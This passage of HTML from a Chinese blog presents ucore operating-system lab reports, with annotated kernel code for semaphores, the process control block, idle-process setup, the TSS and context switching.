class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">up(<span class="keyword">semaphore_t</span> *sem) &#123;</span><br><span class="line">    __up(sem, WT_KSEM);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __noinline <span class="keyword">void</span> __up(<span class="keyword">semaphore_t</span> *sem, <span class="keyword">uint32_t</span> wait_state) &#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">wait_t</span> *wait;</span><br><span class="line">        <span class="comment">// 如果没有进程需要唤醒，增加信号量的值</span></span><br><span class="line">        <span class="keyword">if</span> ((wait = wait_queue_first(&amp;(sem-&gt;wait_queue))) == <span class="literal">NULL</span>)</span><br><span class="line">            sem-&gt;value ++;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="comment">// 否则唤醒在该信号量等待队列中的第一个进程</span></span><br><span class="line">            wakeup_wait(&amp;(sem-&gt;wait_queue), wait, wait_state, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">wakeup_wait(<span class="keyword">wait_queue_t</span> *<span class="built_in">queue</span>, <span class="keyword">wait_t</span> *wait, <span class="keyword">uint32_t</span> wakeup_flags, <span class="keyword">bool</span> del) &#123;</span><br><span class="line">    <span class="comment">// 在信号量等待队列删除该进程</span></span><br><span class="line">    <span class="keyword">if</span> (del)</span><br><span class="line">        wait_queue_del(<span class="built_in">queue</span>, wait);</span><br><span class="line">    wait-&gt;wakeup_flags = wakeup_flags;</span><br><span class="line">    <span class="comment">// 唤醒进程</span></span><br><span class="line">    wakeup_proc(wait-&gt;proc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">wakeup_proc(struct proc_struct *proc) &#123;</span><br><span class="line">    assert(proc-&gt;state != PROC_ZOMBIE);</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 设置进程状态为就绪</span></span><br><span class="line">        <span class="keyword">if</span> (proc-&gt;state != PROC_RUNNABLE) &#123;</span><br><span class="line">            proc-&gt;state = PROC_RUNNABLE;</span><br><span class="line">            proc-&gt;wait_state = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (proc != current) &#123;</span><br><span class="line">                <span class="comment">// 将进程放入调度队列</span></span><br><span class="line">                sched_class_enqueue(proc);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            warn(<span class="string">&quot;wakeup runnable process.\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="down"><a href="#down" class="headerlink" title="down"></a>down</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">down(<span class="keyword">semaphore_t</span> *sem) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags = __down(sem, WT_KSEM);</span><br><span class="line">    assert(flags == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __noinline <span class="keyword">uint32_t</span> __down(<span class="keyword">semaphore_t</span> *sem, <span class="keyword">uint32_t</span> wait_state) &#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line"></span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    <span class="comment">// 如果信号量大于 0</span></span><br><span class="line">    <span class="keyword">if</span> (sem-&gt;value &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 减完信号量直接返回</span></span><br><span class="line">        sem-&gt;value --;</span><br><span class="line">        local_intr_restore(intr_flag);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">wait_t</span> __wait, *wait = &amp;__wait;</span><br><span class="line">    <span class="comment">// 将当前的进程放入等待队列</span></span><br><span class="line">    wait_current_set(&amp;(sem-&gt;wait_queue), wait, wait_state);</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 切到其他进程，放弃时间片</span></span><br><span class="line">    schedule();</span><br><span class="line"></span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    <span class="comment">//恢复执行后将当前进程从wait队列删除</span></span><br><span class="line">    wait_current_del(&amp;(sem-&gt;wait_queue), wait);</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (wait-&gt;wakeup_flags != wait_state) &#123;</span><br><span class="line">        <span class="keyword">return</span> wait-&gt;wakeup_flags;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">wait_current_set(<span class="keyword">wait_queue_t</span> *<span class="built_in">queue</span>, <span class="keyword">wait_t</span> *wait, <span class="keyword">uint32_t</span> wait_state) &#123;</span><br><span class="line">    <span class="comment">// 用当前的进程建一个 wait 结构体放入信号量等待队列</span></span><br><span class="line">    wait_init(wait, current);</span><br><span class="line">    <span class="comment">// 设置当前的进程状态为睡眠状态，后面调用 schedule 放弃时间片</span></span><br><span class="line">    current-&gt;state = PROC_SLEEPING;</span><br><span class="line">    current-&gt;wait_state = wait_state;</span><br><span class="line">    wait_queue_add(<span class="built_in">queue</span>, wait);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="管程"><a href="#管程" class="headerlink" title="管程"></a>管程</h2><p><a target="_blank" rel="noopener" href="https://kiprey.github.io/2020/09/uCore-7/#%E7%BB%83%E4%B9%A02">管程</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/24/Lab4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lagrange">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lagrange's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/24/Lab4/" class="post-title-link" itemprop="url">Lab4 实验报告</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-01-24 10:47:34" itemprop="dateCreated datePublished" datetime="2021-01-24T10:47:34Z">2021-01-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-23 00:27:48" itemprop="dateModified" datetime="2021-04-23T00:27:48Z">2021-04-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/OS/" itemprop="url" rel="index"><span itemprop="name">OS</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Lab4"><a href="#Lab4" class="headerlink" title="Lab4"></a>Lab4</h1><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="进程控制块-PCB"><a href="#进程控制块-PCB" class="headerlink" title="进程控制块 PCB"></a>进程控制块 PCB</h3><p>在 ucore 中，并不显式的区分进程与线程，都使用同样的数据结构 proc_struct 进程/线程管理块进行管理。当不同的线程控制块对应的页表(cr3)相同时，ucore 认为是同一进程下的不同线程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//由于进程数量可能较大，倘若从头向后遍历查找符合某个状态的PCB，则效率会十分低下</span></span><br><span class="line"><span class="comment">//因此使用了哈希表作为遍历所用的数据结构。</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">list_entry_t</span> hash_list[HASH_LIST_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="comment">//进程调度时用这个链表顺着索引</span></span><br><span class="line"><span class="keyword">list_entry_t</span> proc_list;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">proc_state</span> &#123;</span></span><br><span class="line">    PROC_UNINIT = <span class="number">0</span>,  <span class="comment">// 未初始化的     -- alloc_proc</span></span><br><span class="line">    PROC_SLEEPING,    <span class="comment">// 等待状态       -- try_free_pages, do_wait, do_sleep</span></span><br><span class="line">    PROC_RUNNABLE,    <span class="comment">// 就绪/运行状态   -- proc_init, wakeup_proc,</span></span><br><span class="line">    PROC_ZOMBIE,      <span class="comment">// 僵死状态       -- do_exit</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> &#123;</span>  <span class="comment">// 保存的上下文寄存器，注意没有eax寄存器和段寄存器</span></span><br><span class="line">    <span class="keyword">uint32_t</span> eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ebx;</span><br><span class="line">    <span class="keyword">uint32_t</span> ecx;</span><br><span class="line">    <span class="keyword">uint32_t</span> edx;</span><br><span class="line">    <span class="keyword">uint32_t</span> esi;</span><br><span class="line">    <span class="keyword">uint32_t</span> edi;</span><br><span class="line">    <span class="keyword">uint32_t</span> ebp;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 进程控制块结构（ucore进程和线程都使用proc_struct进行管理）</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">proc_state</span> <span class="title">state</span>;</span>          <span class="comment">// 当前进程的状态</span></span><br><span class="line">    <span class="keyword">int</span> pid;                        <span class="comment">// 进程ID</span></span><br><span class="line">    <span class="keyword">int</span> runs;                       <span class="comment">// 当前进程被调度的次数</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> kstack;               <span class="comment">// 内核栈</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">bool</span> need_resched;     <span class="comment">// 是否需要被调度</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">parent</span>;</span>     <span class="comment">// 父进程ID</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span>           <span class="comment">// 当前进程所管理的虚拟内存页，包括其所属的页目录项PDT</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>         <span class="comment">// 保存的上下文</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span>;</span>           <span class="comment">// 中断所保存的上下文</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> cr3;                  <span class="comment">// 页目录表的地址</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flags;                 <span class="comment">// 当前进程的相关标志</span></span><br><span class="line">    <span class="keyword">char</span> name[PROC_NAME_LEN + <span class="number">1</span>];   <span class="comment">// 进程名称（可执行文件名）</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> list_link;         <span class="comment">// 用于连接list 切进程用的那个</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> hash_link;         <span class="comment">// 用于连接hash list 链在hash表上的那个</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="idleproc"><a href="#idleproc" class="headerlink" title="idleproc"></a>idleproc</h2><p>idleproc 作为 ucore 的第一个进程，其目的就是会执行 cpu_idle 函数，并从中调用 schedule 函数，准备开始调度进程。作为第一个内核进程，可以说在它之前 ucore 所有执行的内容是没有进程的概念的，但 idleproc 出现后 ucore 后面的初始化代码都是以 idleproc 进程的名义执行。</p>
<p>下面是对 ucore 进行的初始化操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 分配一个proc_struct结构</span></span><br><span class="line"><span class="keyword">if</span> ((idleproc = alloc_proc()) == <span class="literal">NULL</span>)</span><br><span class="line">    panic(<span class="string">&quot;cannot alloc idleproc.\n&quot;</span>);</span><br><span class="line"><span class="comment">// 该空闲进程作为第一个进程，pid为0</span></span><br><span class="line">idleproc-&gt;pid = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 设置该空闲进程始终可运行</span></span><br><span class="line">idleproc-&gt;state = PROC_RUNNABLE;</span><br><span class="line"><span class="comment">// 设置空闲进程的内核栈</span></span><br><span class="line">idleproc-&gt;kstack = (<span class="keyword">uintptr_t</span>)bootstack;</span><br><span class="line"><span class="comment">// 设置该空闲进程为可调度</span></span><br><span class="line">idleproc-&gt;need_resched = <span class="number">1</span>;</span><br><span class="line">set_proc_name(idleproc, <span class="string">&quot;idle&quot;</span>);</span><br><span class="line">nr_process++;</span><br><span class="line"><span class="comment">// 设置当前运行的进程为该空闲进程</span></span><br><span class="line">current = idleproc;</span><br></pre></td></tr></table></figure>
<p>这段初始化将 ucore 在 entry.S 设置的新的栈赋给了 idleproc-&gt;kstack，ucore 一直到现在只用过两个栈，第一个是在启动块设置段表的时候顺手把栈改成 0x7c00 处，后面是在 entry.S 中声明了两页大小的内核栈，一直用到现在。这也表明了剩下的函数以 idleproc 的名义在执行，至于其 context 上下文，在 switch_to(from, to)会被换到其 PCB 的 context 中。</p>
<h2 id="TSS"><a href="#TSS" class="headerlink" title="TSS"></a>TSS</h2><p>TSS 是一个特殊的段。在 Linux 中，CPU 从系统态切换到用户态时会用到 TSS 里面的 ss0 和 esp0。每个 CPU 只维护一个 TSS。TR 寄存器指向这个 TSS，切换时里面的 ss0 和 esp0 会有改变。相应有一个 TSS 段放在 GDT 中，是 GDT 的一个表项。</p>
<p>在 CPU 的中断被触发的时候，CPU 会通过 TR 寄存器中的值找到位于 GDT 表中的 TSS 段，该段指向了一个 TSS 结构体，在这个结构体中 CPU 取出里面的 ss0 和 esp0，将新的栈地址设置为 ss0 和 esp0，并将之前旧的 ss，espeflags，cs，eip 全部压到新的栈里面去。所以观察一个栈帧的结构可以发现。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pushregs</span> <span class="title">tf_regs</span>;</span>   <span class="comment">//那大堆push后的pushal压进去的</span></span><br><span class="line">    <span class="keyword">uint16_t</span> tf_gs;            <span class="comment">//跳转到__alltraps后那一大堆push压进去的</span></span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding0;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_fs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding1;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_es;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding2;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_ds;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding3;</span><br><span class="line">    <span class="keyword">uint32_t</span> tf_trapno;</span><br><span class="line">    <span class="comment">/* below here defined by x86 hardware */</span>这些东西是CPU切换到内核栈的时候自动压进去的</span><br><span class="line">    <span class="keyword">uint32_t</span> tf_err;</span><br><span class="line">    <span class="keyword">uintptr_t</span> tf_eip;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_cs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding4;</span><br><span class="line">    <span class="keyword">uint32_t</span> tf_eflags;</span><br><span class="line">    <span class="comment">/* below here only when crossing rings, such as from user to kernel */</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> tf_esp;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_ss;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>__alltraps 执行完成 pushal 后</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># load GD_KDATA into %ds and %es to set up data segments for kernel</span></span><br><span class="line">movl $GD_KDATA, %eax</span><br><span class="line">movw %ax, %ds  设置新的ds、es，旧的已经被压到trapframe里了</span><br><span class="line">movw %ax, %es</span><br><span class="line"></span><br><span class="line"><span class="meta"># push %esp to pass a pointer to the trapframe as an argument to trap()</span></span><br><span class="line">pushl %esp    现在的栈顶值esp指向了一个完整的栈帧，当作参数传给trap就能够根据栈帧进行中断处理</span><br><span class="line"></span><br><span class="line"><span class="meta"># call trap(tf), where tf=%esp</span></span><br><span class="line">call trap</span><br></pre></td></tr></table></figure>
<h3 id="TSS-的设置"><a href="#TSS-的设置" class="headerlink" title="TSS 的设置"></a>TSS 的设置</h3><p>首先是在最后一次设置 GDT 表的时候</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">segdesc</span> <span class="title">gdt</span>[] =</span> &#123;</span><br><span class="line">    SEG_NULL,</span><br><span class="line">    [SEG_KTEXT] = SEG(STA_X | STA_R, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_KERNEL),</span><br><span class="line">    [SEG_KDATA] = SEG(STA_W, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_KERNEL),</span><br><span class="line">    [SEG_UTEXT] = SEG(STA_X | STA_R, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_USER),</span><br><span class="line">    [SEG_UDATA] = SEG(STA_W, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_USER),</span><br><span class="line">    [SEG_TSS]   = SEG_NULL,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">taskstate</span> &#123;</span></span><br><span class="line">    .......</span><br><span class="line">    <span class="keyword">uintptr_t</span> ts_esp0;      <span class="comment">// stack pointers and segment</span></span><br><span class="line">    <span class="keyword">uint16_t</span> ts_ss0;        <span class="comment">// after an increase in</span></span><br><span class="line">    <span class="keyword">uint16_t</span> ts_iomb;       <span class="comment">// i/o map base address</span></span><br><span class="line">    .......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">taskstate</span> <span class="title">ts</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* gdt_init - initialize the default GDT and TSS */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">gdt_init(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="comment">// set boot kernel stack and default SS0</span></span><br><span class="line">    ts.ts_esp0 = (<span class="keyword">uintptr_t</span>)bootstacktop;</span><br><span class="line">    ts.ts_ss0 = KERNEL_DS;<span class="comment">//段基址寄存器 13位索引+1位T1+2位CPL</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// initialize the TSS filed of the gdt</span></span><br><span class="line">    gdt[SEG_TSS] = SEGTSS(STS_T32A, (<span class="keyword">uintptr_t</span>)&amp;ts, <span class="keyword">sizeof</span>(ts), DPL_KERNEL);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reload all segment registers</span></span><br><span class="line">    lgdt(&amp;gdt_pd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// load the TSS</span></span><br><span class="line">    <span class="comment">//一个gdt表项八个字节，所以GD_TSS = ((SEG_TSS) &lt;&lt; 3) = SEG_TSS*8 TR寄存器里面存的是偏移</span></span><br><span class="line">    ltr(GD_TSS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先是把当前的 TSS 设置为了之前 entry.S 申请的栈底（栈向低地址处生长，那段汇编先写的 bootstack 再写的 bootstacktop，所以 bootstacktop 是高地址，作为栈底），再将 TSS 中的 ss0 换成内核栈的段选择子，最后是将 GDT 的最后一项 TSS 填充完成，在 load TR 寄存器，完成当前的 TSS 设置（就当现在执行的是 idleproc 进程的话，TSS 里面确实也是存的这个进程的内核栈地址）。</p>
<p>然后再每次程序切换的时候</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// setup_kstack - alloc pages with size KSTACKPAGE as process kernel stack</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">setup_kstack(struct proc_struct *proc)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> =</span> alloc_pages(KSTACKPAGE);</span><br><span class="line">    <span class="keyword">if</span> (page != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        proc-&gt;kstack = (<span class="keyword">uintptr_t</span>)page2kva(page);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">proc_run</span><span class="params">(struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (proc != current) &#123;</span><br><span class="line">        <span class="keyword">bool</span> intr_flag;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">prev</span> =</span> current, *next = proc;</span><br><span class="line">        <span class="comment">//设置内核栈地址与加载页目录项等这类关键操作不能被中断给打断。</span></span><br><span class="line">        local_intr_save(intr_flag);</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 设置当前执行的进程</span></span><br><span class="line">            current = proc;</span><br><span class="line">            <span class="comment">// 设置ring0的内核栈地址</span></span><br><span class="line">            load_esp0(next-&gt;kstack + KSTACKSIZE);</span><br><span class="line">            <span class="comment">// 加载页目录表</span></span><br><span class="line">            lcr3(next-&gt;cr3);</span><br><span class="line">            <span class="comment">// 切换上下文</span></span><br><span class="line">            switch_to(&amp;(prev-&gt;context), &amp;(next-&gt;context));</span><br><span class="line">        &#125;</span><br><span class="line">        local_intr_restore(intr_flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.globl switch_to</span><br><span class="line">switch_to:                      # switch_to(from, to)</span><br><span class="line">    # save from&#x27;s registers</span><br><span class="line">    movl <span class="number">4</span>(%esp), %eax          # 获取当前进程的context结构地址</span><br><span class="line">    popl <span class="number">0</span>(%eax)                # 将eip保存至当前进程的context结构</span><br><span class="line">    movl %esp, <span class="number">4</span>(%eax)          # 将esp保存至当前进程的context结构</span><br><span class="line">    movl %ebx, <span class="number">8</span>(%eax)          # 将ebx保存至当前进程的context结构</span><br><span class="line">    movl %ecx, <span class="number">12</span>(%eax)         # 将ecx保存至当前进程的context结构</span><br><span class="line">    movl %edx, <span class="number">16</span>(%eax)         # 将edx保存至当前进程的context结构</span><br><span class="line">    movl %esi, <span class="number">20</span>(%eax)         # 将esi保存至当前进程的context结构</span><br><span class="line">    movl %edi, <span class="number">24</span>(%eax)         # 将edi保存至当前进程的context结构</span><br><span class="line">    movl %ebp, <span class="number">28</span>(%eax)         # 将ebp保存至当前进程的context结构</span><br><span class="line"></span><br><span class="line">    # restore to&#x27;s registers</span><br><span class="line">    movl <span 